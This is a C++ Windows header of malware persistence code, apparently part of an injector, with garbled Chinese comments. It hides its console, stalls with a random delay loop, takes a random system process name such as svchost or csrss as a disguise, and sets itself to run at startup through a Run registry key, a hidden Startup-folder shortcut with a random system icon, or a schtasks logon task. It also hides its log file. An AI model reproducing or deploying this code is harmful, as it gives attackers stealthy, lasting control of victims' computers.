#pragma once
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <string>
#include <random>
#include <shlobj.h>
#include <objbase.h>
#include <iostream>
#include <type_traits>
#include <fstream>
#include <vector>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#include "Skcrypt.h"

// ״̬�����ܵ������ⵯ����
#define STATUS_PIPE_NAME skCrypt(L"\\\\.\\pipe\\InjectStatusPipe").decrypt()

// ��ȫAPI�������� - �޸�����ָ���������ַ�������
class SecureAPILoader {
private:
    template <typename Func>
    Func LoadDynamicAPI(const char* libName, const char* funcName) {
        HMODULE hModule = LoadLibraryA(libName);
        if (!hModule) return nullptr;
        return reinterpret_cast<Func>(GetProcAddress(hModule, funcName));
    }

public:
    // �޸�����ָ������
    using CoInitializeFn = decltype(&CoInitialize);
    using CoCreateInstanceFn = decltype(&CoCreateInstance);
    using CoUninitializeFn = decltype(&CoUninitialize);
    using SHGetFolderPathWFn = decltype(&SHGetFolderPathW);
    using GetModuleFileNameWFn = decltype(&GetModuleFileNameW);
    using MessageBoxWFn = decltype(&MessageBoxW);

    // ʹ��ʵ�ʺ���ǩ��
    CoInitializeFn pCoInitialize = nullptr;
    CoCreateInstanceFn pCoCreateInstance = nullptr;
    CoUninitializeFn pCoUninitialize = nullptr;
    SHGetFolderPathWFn pSHGetFolderPathW = nullptr;
    GetModuleFileNameWFn pGetModuleFileNameW = nullptr;
    MessageBoxWFn pMessageBoxW = nullptr;

    SecureAPILoader() {
        // ��̬���غ���API
        pCoInitialize = LoadDynamicAPI<CoInitializeFn>("ole32.dll", "CoInitialize");
        pCoCreateInstance = LoadDynamicAPI<CoCreateInstanceFn>("ole32.dll", "CoCreateInstance");
        pCoUninitialize = LoadDynamicAPI<CoUninitializeFn>("ole32.dll", "CoUninitialize");
        pSHGetFolderPathW = LoadDynamicAPI<SHGetFolderPathWFn>("shell32.dll", "SHGetFolderPathW");
        pGetModuleFileNameW = LoadDynamicAPI<GetModuleFileNameWFn>("kernel32.dll", "GetModuleFileNameW");

        // ���ط������API
        HMODULE hUser32 = LoadLibraryW(L"user32.dll");
        if (hUser32) {
            pMessageBoxW = reinterpret_cast<MessageBoxWFn>(GetProcAddress(hUser32, "MessageBoxW"));
        }
    }
};

// ��ȫ��COM�����ͷź���
template <typename T>
void SafeRelease(T*& p) {
    if (p) {
        p->Release();
        p = nullptr;
    }
}

// ============ ����ϵͳ ============
namespace FeedbackSystem {
    // ȷ���ṩ�����Ķ��ַ�ʽ
    void ProvideFeedback(bool success, const wchar_t* message) {
        SecureAPILoader loader;

        // 0. �����ڴ��źţ�������֤��
        wchar_t signalData[] = { L'F', L'E', L'E', L'D', success ? L'1' : L'0' };
        GlobalAlloc(GMEM_FIXED, sizeof(signalData));

        // 1. ������ʾ��������ѡ��
        if (loader.pMessageBoxW) {
            const wchar_t* title = success ? L"�������" : L"����ʧ��";
            loader.pMessageBoxW(nullptr, message, title, MB_OK | (success ? MB_ICONINFORMATION : MB_ICONERROR));
        }

        // 2. д����־�ļ�����ѡ��
        wchar_t tempPath[MAX_PATH] = { 0 };
        if (GetTempPathW(MAX_PATH, tempPath)) {
            wchar_t logPath[MAX_PATH];
            wcscpy_s(logPath, tempPath);
            wcscat_s(logPath, L"\\SystemHelper_Log.txt");

            std::wofstream logFile(logPath, std::ios::out | std::ios::app);
            if (logFile) {
                SYSTEMTIME sysTime;
                GetLocalTime(&sysTime);
                logFile << L"[" << sysTime.wYear << L"-" << sysTime.wMonth << L"-" << sysTime.wDay
                    << L" " << sysTime.wHour << L":" << sysTime.wMinute << L":" << sysTime.wSecond
                    << L"] ";
                logFile << message << std::endl;
                logFile.close();

                // �����������ԣ������û���ɾ
                SetFileAttributesW(logPath, FILE_ATTRIBUTE_HIDDEN);
            }
        }

        // 3. ȷ������������ֶΣ�����̨��
        if (success) {
            wprintf(L"[SUCCESS] %s\n", message);
        }
        else {
            wprintf(L"[ERROR] %s\n", message);
        }

        // 4. �����źţ���԰�ȫ�����
        wchar_t successCode[] = L"SC0xSYSHELPER";
        GlobalAddAtomW(successCode);

        if (!success) {
            wchar_t errorCode[] = L"ERR0xSYSHELPER";
            GlobalAddAtomW(errorCode);
        }

        // 5. ϵͳ�������������ձ�֤��
        if (success) {
            MessageBeep(MB_ICONASTERISK);
        }
        else {
            MessageBeep(MB_ICONHAND);
        }
    }
}

// ����αװ�ļ����Ŀ�ݷ�ʽ���ؼ��Ľ���
bool CreateDisguisedShortcut(const wchar_t* targetPath, const wchar_t* shortcutDir,
    const wchar_t* displayName, const wchar_t* iconPath, int iconIndex) {
    SecureAPILoader loader;
    HRESULT hr = S_OK;
    IShellLinkW* psl = nullptr;
    bool success = false;

    // 1. ��ʼ��COM
    if (loader.pCoInitialize && FAILED(hr = loader.pCoInitialize(nullptr))) {
        wchar_t msg[256];
        swprintf_s(msg, L"COM��ʼ��ʧ�� (�������: 0x%08X)", hr);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    // 2. ����ShellLink����
    if (!loader.pCoCreateInstance ||
        FAILED(hr = loader.pCoCreateInstance(
            CLSID_ShellLink,
            nullptr,
            CLSCTX_INPROC_SERVER,
            IID_IShellLinkW,
            reinterpret_cast<void**>(&psl)))) {
        wchar_t msg[256];
        swprintf_s(msg, L"����ShellLink����ʧ�� (�������: 0x%08X)", hr);
        FeedbackSystem::ProvideFeedback(false, msg);
        if (loader.pCoUninitialize) loader.pCoUninitialize();
        return false;
    }

    // 3. ����αװ��Ŀ�ݷ�ʽ·��
    wchar_t shortcutPath[MAX_PATH];
    wcscpy_s(shortcutPath, shortcutDir);
    wcscat_s(shortcutPath, L"\\");
    wcscat_s(shortcutPath, displayName);
    wcscat_s(shortcutPath, L".lnk");

    do {
        // 4. ����Ŀ��·��
        if (FAILED(hr = psl->SetPath(targetPath))) {
            wchar_t msg[256];
            swprintf_s(msg, L"����·��ʧ�� (�������: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            break;
        }

        // 5. ����ͼ��αװ���ؼ��Ľ���
        if (iconPath && FAILED(hr = psl->SetIconLocation(iconPath, iconIndex))) {
            wchar_t msg[256];
            swprintf_s(msg, L"����ͼ��αװʧ�� (�������: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            // ����ִ�У�αװʧ�ܲ�����������
        }

        // 6. �����ݷ�ʽ
        IPersistFile* ppf = nullptr;
        if (FAILED(hr = psl->QueryInterface(IID_IPersistFile, reinterpret_cast<void**>(&ppf)))) {
            wchar_t msg[256];
            swprintf_s(msg, L"��ȡIPersistFile�ӿ�ʧ�� (�������: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            break;
        }

        if (FAILED(hr = ppf->Save(shortcutPath, TRUE))) {
            wchar_t msg[256];
            swprintf_s(msg, L"����αװ��ݷ�ʽʧ�� (�������: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            SafeRelease(ppf);
            break;
        }

        SafeRelease(ppf);

        // 7. ��������������ǿαװ
        if (!SetFileAttributesW(shortcutPath, FILE_ATTRIBUTE_HIDDEN)) {
            FeedbackSystem::ProvideFeedback(false, L"������������ʧ�ܣ���αװ�Ѵ���");
        }

        wchar_t successMsg[256];
        swprintf_s(successMsg, L"�ɹ�����αװ���������%s", shortcutPath);
        FeedbackSystem::ProvideFeedback(true, successMsg);
        success = true;
    } while (false);

    // 8. ������Դ
    SafeRelease(psl);
    if (loader.pCoUninitialize) loader.pCoUninitialize();

    return success;
}

// ��ȡ��ǰ�û������ļ���·�����ؼ��Ľ���
bool GetCurrentUserStartupPath(wchar_t* startupPath, DWORD bufferSize) {
    // ʹ�û�����������·��������API���أ�
    if (GetEnvironmentVariableW(L"APPDATA", startupPath, bufferSize) == 0) {
        FeedbackSystem::ProvideFeedback(false, L"��ȡAPPDATA��������ʧ��");
        return false;
    }

    // ������������·��
    if (wcslen(startupPath) + wcslen(L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") >= bufferSize) {
        FeedbackSystem::ProvideFeedback(false, L"����·������������");
        return false;
    }
    wcscat_s(startupPath, bufferSize, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    return true;
}

// ����1��ע���������޹���ԱȨ�ޣ�
bool CreateRegistryStartup(const wchar_t* targetPath, const wchar_t* displayName) {
    HKEY hKey;
    LONG result;

    // ��ע����
    result = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);

    if (result != ERROR_SUCCESS) {
        wchar_t msg[256];
        swprintf_s(msg, L"��ע���ʧ�� (�������: %d)", result);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    // �������ȷ��·����ȫ
    std::wstring quotedPath = L"\"" + std::wstring(targetPath) + L"\"";

    // ����ע���ֵ
    result = RegSetValueExW(hKey, displayName, 0, REG_SZ,
        (const BYTE*)quotedPath.c_str(),
        (quotedPath.length() + 1) * sizeof(wchar_t));

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        wchar_t msg[256];
        swprintf_s(msg, L"д��ע���ʧ�� (�������: %d)", result);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    wchar_t successMsg[256];
    swprintf_s(successMsg, L"�ɹ�����ע��������%s", displayName);
    FeedbackSystem::ProvideFeedback(true, successMsg);
    return true;
}

// ����2�������ļ��п�ݷ�ʽ
bool CreateStartupFolderShortcut(const wchar_t* targetPath, const wchar_t* displayName) {
    wchar_t startupPath[MAX_PATH] = { 0 };
    if (!GetCurrentUserStartupPath(startupPath, MAX_PATH)) {
        return false;
    }

    const wchar_t* iconPaths[] = {
        L"C:\\Windows\\System32\\shell32.dll",
        L"C:\\Windows\\System32\\imageres.dll",
        L"C:\\Windows\\System32\\ddores.dll"
    };

    // ���ѡ��ͼ��
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    std::mt19937 gen(static_cast<unsigned int>(counter.QuadPart));
    std::uniform_int_distribution<> dis(0, 2);
    const wchar_t* iconPath = iconPaths[dis(gen)];

    // ���ͼ������
    std::uniform_int_distribution<> iconDis(0, 100);
    int iconIndex = iconDis(gen);

    return CreateDisguisedShortcut(targetPath, startupPath, displayName, iconPath, iconIndex);
}

// ����3������ƻ������޹���ԱȨ�ޣ�
bool CreateTaskSchedulerStartup(const wchar_t* targetPath, const wchar_t* displayName) {
    // �����������ƣ�ʹ��αװ����
    std::wstring taskName = L"\\SystemHelper_";
    taskName += displayName;

    // ����schtasks����
    std::wstring command = L"schtasks /create /tn \"";
    command += taskName;
    command += L"\" /tr \"";
    command += targetPath;
    command += L"\" /sc onlogon /ru \"\" /f";

    // ִ������
    int result = _wsystem(command.c_str());

    if (result != 0) {
        wchar_t msg[256];
        swprintf_s(msg, L"�����ƻ�����ʧ�� (���ش���: %d)", result);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    wchar_t successMsg[256];
    swprintf_s(successMsg, L"�ɹ������ƻ�����%s", taskName.c_str());
    FeedbackSystem::ProvideFeedback(true, successMsg);
    return true;
}

// ����������������ʹ�����ַ�����
bool CreateSecureStartupShortcut() {
    // 1. ��ȡ����·��
    wchar_t szPath[MAX_PATH] = { 0 };
    if (GetModuleFileNameW(nullptr, szPath, MAX_PATH) == 0) {
        FeedbackSystem::ProvideFeedback(false, L"��ȡģ��·��ʧ��");
        return false;
    }

    // 2. ��̬αװ����
    const wchar_t* systemProcesses[] = {
        L"RuntimeBroker", L"dwm", L"csrss", L"svchost", L"ctfmon"
    };
    const int processCount = sizeof(systemProcesses) / sizeof(systemProcesses[0]);

    // ʹ�ø߾���ʱ��������ǿ�����
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    std::mt19937 gen(static_cast<unsigned int>(counter.QuadPart));
    std::uniform_int_distribution<> dis(0, processCount - 1);

    const wchar_t* disguisedName = systemProcesses[dis(gen)];

    // 3. ������������������
    bool success = false;

    // ����1��ע���������
    if (!success) {
        FeedbackSystem::ProvideFeedback(true, L"����ע����������");
        success = CreateRegistryStartup(szPath, disguisedName);
    }

    // ����2�������ļ��п�ݷ�ʽ
    if (!success) {
        FeedbackSystem::ProvideFeedback(true, L"���������ļ��п�ݷ�ʽ");
        success = CreateStartupFolderShortcut(szPath, disguisedName);
    }

    // ����3������ƻ�����
    if (!success) {
        FeedbackSystem::ProvideFeedback(true, L"��������ƻ����򷽷�");
        success = CreateTaskSchedulerStartup(szPath, disguisedName);
    }

    return success;
}

// ����ں�����ǿ�Ʒ������ƣ�
int startself() {
    // ���ش���
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // ��Ӹ߼�����ӳٸ��ŷ���
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    std::mt19937 gen(static_cast<unsigned int>(counter.QuadPart));
    std::uniform_int_distribution<> dis(500, 5000);
    int delayCount = dis(gen);

    // ʹ�ø���Ȼ�ļ���ģʽ
    for (int i = 0; i < delayCount; i++) {
        volatile double dummy = std::log(i + 1) * std::sqrt(i);
        (void)dummy;
    }

    // ��ʼ��������ȷ����ʼ������
    FeedbackSystem::ProvideFeedback(true, L"ϵͳ���ֿ�ʼִ�в���");

    // ��֤�������ռ�����
    __try {
        // 1. ���Դ�����������
        bool creationResult = CreateSecureStartupShortcut();

        // 2. ���շ���
        if (creationResult) {
            FeedbackSystem::ProvideFeedback(true, L"�ɹ�����������������");
            return 0;
        }
        else {
            FeedbackSystem::ProvideFeedback(false, L"��������������ʧ��");
            return 1;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // �����κα����������֤����
        wchar_t errorMsg[256];
        DWORD exceptionCode = GetExceptionCode();
        swprintf_s(errorMsg, L"������������� (�쳣����: 0x%08X)", exceptionCode);
        FeedbackSystem::ProvideFeedback(false, errorMsg);
        return 3;
    }
}